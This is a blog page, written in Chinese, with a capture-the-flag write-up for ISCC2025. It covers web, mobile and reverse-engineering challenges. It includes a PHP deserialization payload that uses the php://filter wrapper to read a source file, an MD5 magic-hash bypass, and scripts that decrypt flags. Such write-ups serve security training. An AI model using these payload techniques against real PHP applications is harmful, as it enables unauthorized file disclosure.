<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
     <link rel="shortcut icon" href= /img/huaji.ico >
    <title>
        blog
    </title>
    <meta name="description" content= 歪比歪比 >
    <meta name="keywords" content= Blog,Hexo,Huaji >
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>
<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-home
 replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            ISCC2025-WP
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h1 id="ISCC2025-WP"><a href="#ISCC2025-WP" class="headerlink" title="ISCC2025-WP"></a>ISCC2025-WP</h1><h1 id="区域赛"><a href="#区域赛" class="headerlink" title="区域赛"></a>区域赛</h1><h3 id="web-哪吒的试炼"><a href="#web-哪吒的试炼" class="headerlink" title="web-哪吒的试炼"></a>web-哪吒的试炼</h3><p>题目提到要吃藕，并且附上了翻译，所以想到在get里填参数，即</p>
<p><code>112.126.73.173:9999?food=lotus root</code>，跳转</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-web1-1.png" alt="qy-web1-1"></p>
<p>进去发现按钮点不了，f12删掉标签中的<code>disabled=&quot;&quot;</code>，点击之后看见php</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-web1-2.png" alt="qy-web1-2"></p>
<p>分析得知，第一个用双写绕过，第二个用md5值为0e的两个字符串绕过，所以post请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nezha=&#123;&quot;incantation&quot;:&quot;I_am_the_I_am_the_spirit_of_firespirit_of_fire&quot;,&quot;md5&quot;:&quot;s878926199a&quot;,&quot;power&quot;:&quot;s155964671a&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-web1-3.png" alt="qy-web1-3"></p>
<p>发现<strong>明</strong>拆开是<strong>日  月</strong>,对应 <strong>sun</strong>和<strong>moon</strong>，前者去尾后者去头，再将后者倒着写，就是suoom，所以</p>
<p>当时是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明=suoom</span><br><span class="line">李=woolihc</span><br><span class="line">ISCC&#123;早晴枫林红&#125;</span><br></pre></td></tr></table></figure>

<p>所以当时flag是ISCC{suetsueergwooniwwoooowsilrow}</p>
<p>现在应该是ISCC{wooniwwoooowsuetsilrow}</p>
<h3 id="mobile-Detective"><a href="#mobile-Detective" class="headerlink" title="mobile-Detective"></a>mobile-Detective</h3><p>用jadx反编译，打开找到mainActivity，可以发现这一段比对的文字</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-mobile2-1.png" alt="qy-mobile2-1"></p>
<p>发现com.example.detective.a.a(String)中是对密文的操作，所以写脚本跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hex_from_cipher</span>(<span class="params">cipher: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">ord</span>(ch):04x&#125;</span>&#x27;</span> <span class="keyword">for</span> ch <span class="keyword">in</span> cipher)</span><br><span class="line">    <span class="keyword">return</span> hex_str[<span class="number">2</span>:] <span class="keyword">if</span> hex_str.startswith(<span class="string">&#x27;00&#x27;</span>) <span class="keyword">else</span> hex_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_undo_padding</span>(<span class="params">hex_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        hex_str += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_undo_pair_shuffle</span>(<span class="params">replaced: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    out, i = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(replaced):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">3</span> &lt; <span class="built_in">len</span>(replaced) <span class="keyword">and</span> replaced[i+<span class="number">2</span>:i+<span class="number">4</span>] == <span class="string">&#x27;21&#x27;</span>:</span><br><span class="line">            c2, c1 = replaced[i], replaced[i+<span class="number">1</span>]</span><br><span class="line">            out.extend([c1, c2])</span><br><span class="line">            i += <span class="number">4</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.extend(replaced[i:i+<span class="number">2</span>])</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_split_and_fix_zero</span>(<span class="params">concat: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    half = <span class="built_in">len</span>(concat) // <span class="number">2</span></span><br><span class="line">    sb2, sb = concat[:half], concat[half:]</span><br><span class="line">    sb = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> ch == <span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> (idx == <span class="number">0</span> <span class="keyword">or</span> idx % <span class="number">3</span> == <span class="number">0</span>) <span class="keyword">else</span> ch</span><br><span class="line">                 <span class="keyword">for</span> idx, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(sb))</span><br><span class="line">    sb2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> ch == <span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> (idx == <span class="number">1</span> <span class="keyword">or</span> (idx - <span class="number">1</span>) % <span class="number">3</span> == <span class="number">0</span>) <span class="keyword">else</span> ch</span><br><span class="line">                  <span class="keyword">for</span> idx, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(sb2))</span><br><span class="line">    res = []</span><br><span class="line">    even = odd = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(concat)):</span><br><span class="line">        <span class="keyword">if</span> idx % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            res.append(sb[even]);  even += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(sb2[odd]);  odd += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hex_to_plain</span>(<span class="params">hex_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    out, i = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(hex_str):</span><br><span class="line">        <span class="keyword">if</span> hex_str[i] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(hex_str):</span><br><span class="line">            out.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str[i+<span class="number">1</span>:i+<span class="number">3</span>], <span class="number">16</span>)))</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str[i:i+<span class="number">4</span>], <span class="number">16</span>)))</span><br><span class="line">            i += <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;顶层接口：密文 ➜ 明文&quot;&quot;&quot;</span></span><br><span class="line">    step1 = _hex_from_cipher(cipher)</span><br><span class="line">    step2 = _undo_padding(step1)</span><br><span class="line">    step3 = _undo_pair_shuffle(step2)</span><br><span class="line">    step4 = _split_and_fix_zero(step3)</span><br><span class="line">    <span class="keyword">return</span> _hex_to_plain(step4)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    xor_key = [<span class="number">0x53</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>]</span><br><span class="line">    res = <span class="string">&quot;100944420F1F4252655A443C4D53301972&quot;</span></span><br><span class="line"></span><br><span class="line">    res_chr=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">2</span>):</span><br><span class="line">        res_chr.append((<span class="built_in">int</span>(res[i:i+<span class="number">2</span>],<span class="number">16</span>)))</span><br><span class="line">    <span class="built_in">print</span>(res_chr)</span><br><span class="line"></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res_chr)):</span><br><span class="line">        flag.append((res_chr[i]^xor_key[i%(<span class="built_in">len</span>(xor_key))]))</span><br><span class="line"></span><br><span class="line">    sample =<span class="built_in">bytes</span>(flag).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cipher :&quot;</span>, sample)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>+decrypt(sample)+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="国赛"><a href="#国赛" class="headerlink" title="国赛"></a>国赛</h1><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>输入<strong>tom</strong></p>
<p>然后<strong>clue&#x3D;O%3A3%3A%22Obj%22%3A0%3A%7B%7D%3B’</strong></p>
<p>可以获得cheese is hidden in flag_of_cheese.php    ，所以payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://112.126.73.173:10086/Y2hlZXNlT25l.php?cheese_tracker=O%3A6%3A%22Cheese%22%3A2%3A%7Bs%3A7%3A%22flavors%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22color%22%3Bs%3A142%3A%22O%3A5%3A%22Jerry%22%3A3%3A%7Bs%3A19%3A%22%00%2A%00secretHidingSpot%22%3Bs%3A62%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag_of_cheese.php%22%3Bs%3A6%3A%22squeak%22%3BN%3Bs%3A5%3A%22shout%22%3BN%3B%7D%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>获取前半段flag</p>
<p>又发现Y2hlZXNlT25l.php，文件名可以用base64解码，解完是cheeseOne，</p>
<h2 id="mobile1-GGAD"><a href="#mobile1-GGAD" class="headerlink" title="mobile1-GGAD"></a>mobile1-GGAD</h2><p>com.example.ggad.b中拿到PRESET_VALUE<img src="/../../../../%E8%B5%84%E6%96%99/md/mobile1-1.png" alt="mobile1-1"></p>
<p>com.example.ggad.c中拿到</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/mobile1-2.png" alt="mobile1-2"></p>
<p>所以可以写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">ci = <span class="string">&#x27;01000011001100010100010000110010001101000011011001000101001100000011010100110011010001100011001101000101001101010011011100110010&#x27;</span></span><br><span class="line">c0 = <span class="string">&#x27;I7C6UH1EXT9P4E38&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_shifts = [<span class="built_in">ord</span>(k.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line">    key_len, key_idx = <span class="built_in">len</span>(key_shifts), <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = key_shifts[key_idx % key_len]</span><br><span class="line">            upper_char = char.upper()</span><br><span class="line">            decrypted_code = (<span class="built_in">ord</span>(upper_char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(decrypted_code)</span><br><span class="line">            decrypted.append(decrypted_char.lower() <span class="keyword">if</span> char.islower() <span class="keyword">else</span> decrypted_char)</span><br><span class="line">            key_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">cs</span>):</span><br><span class="line">    <span class="keyword">return</span> vigenere_decrypt(cs, <span class="string">&#x27;ExpectoPatronum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c2 = a(c0)</span><br><span class="line">c1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(ci[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ci), <span class="number">8</span>))</span><br><span class="line"><span class="comment"># 修改处：使用min(len(c1), len(c2))作为循环次数</span></span><br><span class="line">min_len = <span class="built_in">min</span>(<span class="built_in">len</span>(c1), <span class="built_in">len</span>(c2))</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>.join(c1[i] + c2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_len))</span><br><span class="line"></span><br><span class="line">byte_array = [<span class="built_in">int</span>(c[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">2</span>)]</span><br><span class="line">c3 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;b:08b&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> byte_array)</span><br><span class="line">str1 = c3.translate(<span class="built_in">str</span>.maketrans(<span class="string">&#x27;01&#x27;</span>, <span class="string">&#x27;10&#x27;</span>))</span><br><span class="line">c4 = <span class="built_in">bytes</span>(<span class="built_in">int</span>(str1[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(str1), <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key</span>):</span><br><span class="line">    key = key.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>) <span class="keyword">else</span> key</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">S, data</span>):</span><br><span class="line">    data = data <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>) <span class="keyword">else</span> data.encode()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        result.append(byte ^ S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">S = rc4_ksa(<span class="string">&#x27;ExpectoPatronum&#x27;</span>)</span><br><span class="line">res = rc4_prga(S, c4)</span><br><span class="line">flag = <span class="string">f&quot;ISCC&#123;&#123;<span class="subst">&#123;res.decode()&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#ISCC&#123;H0gw@rts~ExpR3ss&#125;</span></span><br></pre></td></tr></table></figure>



<p>mobile-</p>
<p>ida打开libmobile04.so在Java_com_example_mobile04_MainActivity_getEncryptedSegment函数里，<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-1.png" alt="mobile2-1"></p>
<p>点进aDex035，是一个dex，所以提取出来用jadx打开，</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-2.png" alt="mobile2-2"></p>
<p>从关键字上可以看出是des加密。</p>
<p>打开libSunday.so，进入Java_com_example_mobile04_Sunday_getKey函数，发现字符串：</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-7.png" alt="mobile2-7"></p>
<p>去cyberchef解密</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-5.png" alt="mobile2-5"></p>
<p>之后ida打开libMonday.so，在Java_com_example_mobile04_a_checkFlag2函数中可以看到对enreal的加密<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-3.png" alt="mobile2-3"></p>
<p>扔给ai，获得一个解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：这里假设输入/输出文件名是硬编码的 &quot;enreal&quot; 和 &quot;decode_enreal&quot;，</span></span><br><span class="line"><span class="comment"># 如果需要从命令行读取，请保留上一个回答中的 sys.argv 部分。</span></span><br><span class="line"><span class="comment"># 但是根据您提供的修改脚本的形式，似乎是直接执行这段代码，</span></span><br><span class="line"><span class="comment"># 所以这里保留硬编码的文件名。</span></span><br><span class="line"></span><br><span class="line">input_filename = <span class="string">&quot;enreal&quot;</span></span><br><span class="line">output_filename = <span class="string">&quot;decode_enreal&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = <span class="built_in">list</span>(f.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到输入文件 &#x27;<span class="subst">&#123;input_filename&#125;</span>&#x27;。&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;读取文件 &#x27;<span class="subst">&#123;input_filename&#125;</span>&#x27; 时发生错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    byte_val = data[i] <span class="comment"># 获取当前字节值 (0-255)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现 C 表达式的逻辑:</span></span><br><span class="line">    <span class="comment"># *(_BYTE *)(v9 + i) = ((char)~(((unsigned __int16)*(char *)(v9 + i) &gt;&gt; 6) | (4 * *(_BYTE *)(v9 + i))) &gt;&gt; 3) | (32 * ~(((unsigned __int16)*(char *)(v9 + i) &gt;&gt; 6) | (4 * *(_BYTE *)(v9 + i))));</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 计算子表达式 A = ((unsigned __int16)byte_val &gt;&gt; 6) | (4 * byte_val)</span></span><br><span class="line">    <span class="comment">#    这等同于 byte_val 左循环移位 2 位: (byte_val &lt;&lt; 2) | (byte_val &gt;&gt; 6)</span></span><br><span class="line">    <span class="comment">#    结果需要保持在 8 位范围内 (0-255)</span></span><br><span class="line">    rotated_val_L2 = ((byte_val &lt;&lt; <span class="number">2</span>) | (byte_val &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 对 A 进行 8 位按位非: ~rotated_val_L2</span></span><br><span class="line">    <span class="comment">#    在 Python 中 8 位按位非是 val ^ 0xFF</span></span><br><span class="line">    not_rotated_val = rotated_val_L2 ^ <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 对结果进行右循环移位 3 位: ((char)not_rotated_val &gt;&gt; 3) | (32 * not_rotated_val)</span></span><br><span class="line">    <span class="comment">#    这等同于 (not_rotated_val &gt;&gt; 3) | (not_rotated_val &lt;&lt; 5)</span></span><br><span class="line">    <span class="comment">#    结果需要保持在 8 位范围内 (0-255)</span></span><br><span class="line">    final_val = ((not_rotated_val &gt;&gt; <span class="number">3</span>) | (not_rotated_val &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将计算出的最终值赋回列表</span></span><br><span class="line">    data[i] = final_val</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;写入文件 &#x27;<span class="subst">&#123;output_filename&#125;</span>&#x27; 时发生错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;成功处理文件 &#x27;<span class="subst">&#123;input_filename&#125;</span>&#x27; 并将结果保存到 &#x27;<span class="subst">&#123;output_filename&#125;</span>&#x27;。&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>解密出decode_enreal,用ida打开，可以看见real_check函数，第十五行是密钥，22行是密文<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-4.png"></p>
<p>去cyberchef解密<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-6.png" alt="mobile2-6"></p>
<p>两段拼接之后包裹上ISCC{}就可以了</p>
<h3 id="reverse1-CrackMe"><a href="#reverse1-CrackMe" class="headerlink" title="reverse1-CrackMe"></a>reverse1-CrackMe</h3><p>ida反编译，在main函数按f5看伪代码，进每个函数里瞅瞅</p>
<p>发现是标准rc4，所以直接找个脚本填入数据，数据如图</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re1-1.png" alt="re1-1"></p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re1-2.png" alt="re1-2"></p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re1-3.png" alt="re1-3"></p>
